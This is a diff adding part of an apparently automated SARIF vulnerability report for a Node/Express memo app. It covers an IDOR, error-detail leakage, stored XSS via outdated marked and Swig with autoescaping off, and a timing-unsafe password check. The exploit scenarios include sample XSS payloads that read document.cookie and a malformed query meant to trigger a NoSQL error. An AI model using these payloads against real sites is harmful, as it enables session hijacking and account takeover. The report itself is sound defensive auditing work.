+            "description": "#### Description\nThe displayMemos function extracts userId from req.session (line 22-24) but never passes it to memosDAO.getAllMemos (line 25). The callback renders ALL memos from the database into the view template (line 27-31). An attacker authenticated as any user can view memos created by other users, including those containing sensitive or private information.\n\n#### Impact\nAny authenticated user can view memos belonging to all users, not just their own. The getAllMemos function retrieves every memo in the database without filtering by the requesting user's ID, exposing potentially sensitive memo contents to unauthorized users.\n\n#### Exploit scenario\n1. Attacker registers or logs in as a low-privileged user. 2. Attacker navigates to the memos page. 3. The application displays all memos from the database, including those created by other users, because getAllMemos lacks a userId filter. The attacker can read any memo content that other users have stored.\n\n#### Preconditions\n- Attacker has a valid authenticated session (any user)\n\n```\nthis.displayMemos = (req, res, next) => {\n\n    const {\n        userId\n    } = req.session;\n\n    memosDAO.getAllMemos((err, docs) => {\n        if (err) return next(err);\n        return res.render(\"memos\", {\n            memosList: docs,\n            userId: userId,\n            environmentalScripts\n        });\n    });\n};\n```\n\n#### How to fix\nModify getAllMemos to accept a userId parameter and filter results. In displayMemos, pass req.session.userId to the DAO call: memosDAO.getAllMemos(userId, callback). Update the MemosDAO.getAllMemos implementation to query only memos where userId matches the provided parameter.\n\n**Exploitability:** IDOR in memos: any authenticated user can see all memos, regardless of owner. Post-auth.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 `getAllMemos` returns every document with no userId filter; the route is reachable by any authenticated user; no compensating control found."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-639"
+            }
+          ],
+          "rank": 43.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_6295fcc07a45805039cc44c54fc64a1a"
+          }
+        },
+        {
+          "ruleId": "CWE-209: Generation of Error Message Containing Sensitive Information",
+          "level": "warning",
+          "message": {
+            "text": "Error handler leaks full error object to client  [CVSS 5.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/error.js"
+                },
+                "region": {
+                  "startLine": 3
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.3",
+            "cvssRating": "Medium",
+            "category": "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "cwe": "CWE-209 - Generation of Error Message Containing Sensitive Information",
+            "cweId": "CWE-209",
+            "cweName": "Generation of Error Message Containing Sensitive Information",
+            "cvssScore": 5.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe global Express error-handling middleware at app/routes/error.js receives unauthenticated requests (any route error bubbles here). It passes the raw 'err' object directly into res.render()'s template context without sanitization or filtering. The Swig template engine (configured with autoescape: false) renders the error object's properties (message, stack, and any custom fields) into the HTML response. An attacker can send a malicious request (e.g., NoSQL injection, malformed JSON, or triggering a database validation error) and read the full error disclosure in the rendered page source.\n\n#### Impact\nAn unauthenticated attacker triggering any application error receives the complete error object in the rendered HTML response. This can expose stack traces, internal file paths, database query details, library versions, and sensitive logic, enabling targeted further attacks.\n\n#### Exploit scenario\nAttacker sends a GET request to /allocations/1?threshold=malformed (triggering a known NoSQL injection error) or submits a profile update with an invalid SSN. The application crashes into this error handler, which renders a page containing the full error object stack trace, MongoDB query, and internal file paths. The attacker views the page source to extract this information.\n\n#### Preconditions\n- Attacker can send any HTTP request that triggers an error in any route handler (no authentication required for most error paths)\n\n```\nres.status(500);\nres.render(\"error-template\", {\n    error: err\n});\n```\n\n#### How to fix\nIn app/routes/error.js, never pass the raw error object to the template. Either render a static generic error page (no error data), or construct a safe context object with only a user-friendly message. For development, log the full error server-side only.\n\n**Exploitability:** Error handler leaks full error object to client, including stack traces. Pre-auth, aids reconnaissance.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 Unauthenticated POST /login and POST /signup routes bubble DB errors via next(err) to errorHandler, which passes the raw err object to a Swig template with autoescape:false; no NODE_ENV guard or sanitization exists."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-209"
+            }
+          ],
+          "rank": 53.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_1774efdd6ed2854be5a1162a370d325f"
+          }
+        },
+        {
+          "ruleId": "CWE-1104: Use of Unmaintained Third Party Components",
+          "level": "warning",
+          "message": {
+            "text": "Use of outdated marked library with known XSS  [CVSS 5.4: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 17
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.4",
+            "cvssRating": "Medium",
+            "category": "CWE-1104: Use of Unmaintained Third Party Components",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+            "cwe": "CWE-1104 - Use of Unmaintained Third Party Components",
+            "cweId": "CWE-1104",
+            "cweName": "Use of Unmaintained Third Party Components",
+            "cvssScore": 5.4,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe package.json pins marked to version 0.3.5 (line 17). This version predates the marked v0.4.0 security fix and does not sanitize HTML by default. When combined with the application's global Swig autoescape=false setting, user-supplied Markdown in memos passes through marked unsanitized and is rendered with injected scripts. The data flow: attacker sends a memo via POST /memos (memos.js::addMemos) with body containing malicious Markdown; the memo is stored in MongoDB; any user viewing the memo (memos.js::displayMemos) receives the unsanitized HTML output, executing the XSS.\n\n#### Impact\nAttackers can inject arbitrary HTML/JavaScript into memos which will execute in the browsers of all users viewing the memo, leading to session hijacking and credential theft.\n\n#### Exploit scenario\nAn authenticated attacker posts a memo containing '[click](javascript:alert(document.cookie))'. When any user views the memo, the JavaScript executes in their browser, leaking their session cookie to the attacker.\n\n#### Preconditions\n- Attacker has a valid authenticated session\n- Victim views the attacker's memo\n\n```\n\"marked\": \"0.3.5\"\n```\n\n#### How to fix\nUpgrade marked to version 4.0.0 or later which sanitizes HTML by default, or configure a sanitizer like DOMPurify on the server-side before rendering.\n\n**Exploitability:** Outdated marked library (0.3.5) renders Markdown unsanitized. Combined with Swig autoescape=false enables stored XSS. Requires authenticated memo creation.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 marked@0.3.5 sanitize mode has documented bypasses; autoescape:false removes defense-in-depth; authenticated attacker \u2192 stored XSS confirmed"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-1104"
+            }
+          ],
+          "rank": 54.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_46ca13ae9d24685e43b357dea0645857"
+          }
+        },
+        {
+          "ruleId": "CWE-1104: Use of Unmaintained Third Party Components",
+          "level": "warning",
+          "message": {
+            "text": "Use of outdated Swig template engine  [CVSS 5.4: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 22
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.4",
+            "cvssRating": "Medium",
+            "category": "CWE-1104: Use of Unmaintained Third Party Components",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+            "cwe": "CWE-1104 - Use of Unmaintained Third Party Components",
+            "cweId": "CWE-1104",
+            "cweName": "Use of Unmaintained Third Party Components",
+            "cvssScore": 5.4,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.9,
+            "description": "#### Description\nThe package.json pins swig to ^1.4.2 (line 22). Swig is officially unmaintained and deprecated with known security vulnerabilities in template compilation. The application explicitly sets autoescape: false in the Express configuration, meaning any user-controlled data rendered through Swig templates (such as profile fields, allocation data, memo content) will be emitted without HTML encoding. This creates a persistent XSS vector across multiple endpoints.\n\n#### Impact\nThe pinned Swig version 1.4.2 is unmaintained and contains unresolved security issues including potential for template injection when combined with application-level autoescape=false configuration.\n\n#### Exploit scenario\nAn attacker updates their profile bank routing number with an XSS payload like '111#&lt;script&gt;alert(1)&lt;/script&gt;'. Because Swig with autoescape=false renders it without encoding, any viewer sees and executes the script.\n\n#### Preconditions\n- Application is configured with autoescape=false (confirmed in server.js configuration)\n\n```\n\"swig\": \"^1.4.2\"\n```\n\n#### How to fix\nReplace Swig with an actively maintained template engine like Nunjucks or Handlebars, or at minimum enable autoescaping. Since Swig is unmaintained, migration is strongly recommended.\n\n**Exploitability:** Unmaintained Swig template engine with autoescape=false globally. Any template-rendered user input is served without encoding, enabling XSS.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 autoescape:false confirmed in server.js; swig ^1.4.2 confirmed unmaintained; multiple external entry points render user data unencoded; zero compensating encoding defenses anywhere in the pipeline"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-1104"
+            }
+          ],
+          "rank": 54.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_f0641a39eaed16e1a4bcebf06f67e68a"
+          }
+        },
+        {
+          "ruleId": "CWE-208",
+          "level": "warning",
+          "message": {
+            "text": "Non-constant-time password comparison  [CVSS 5.9: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 60
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.9",
+            "cvssRating": "Medium",
+            "category": "CWE-208",
+            "cvssVector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+            "cwe": "CWE-208",
+            "cweId": "CWE-208",
+            "cvssScore": 5.9,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.85,
+            "description": "#### Description\nThe validateLogin function compares the provided password with the stored password using a plain == operator. This comparison short-circuits on the first mismatching character, leaking timing information that an attacker can use to determine the password character by character.\n\n#### Impact\nAn attacker can exploit timing differences in the password comparison to iteratively guess the correct password of any user, leading to unauthorized account access.\n\n#### Exploit scenario\nAn attacker sends a series of login requests for a target username, each with a guessed password. By measuring the response time differences, they can deduce which characters are correct. Over multiple requests, they reconstruct the full password and gain access to the account.\n\n#### Preconditions\n- Attacker must be able to send multiple login requests and measure response times with sufficient accuracy.\n\n```\nconst comparePassword = [REDACTED-SECRET], fromUser) => {\n  return fromDB === fromUser;\n};\n```\n\n#### How to fix\nUse a constant-time comparison function, such as `crypto.timingSafeEqual` in Node.js, to compare passwords or hashes. Additionally, hash passwords with a secure algorithm like bcrypt before storage.\n\n**Exploitability:** Non-constant-time password comparison leaks password length via timing. Practically low risk, but could aid offline attacks.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 `POST /login` is unauthenticated and directly feeds `req.body.password` into `comparePassword()` which uses non-constant-time `===`; bcrypt constant-time comparison is commented out; no rate limiting, lockout, or any other compensating control exists."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-208"
+            }
+          ],
+          "rank": 59.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_924c956f2e4aceae1b487159a6eb21b6"
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true
+        }
+      ]
+    }
+  ]
+}
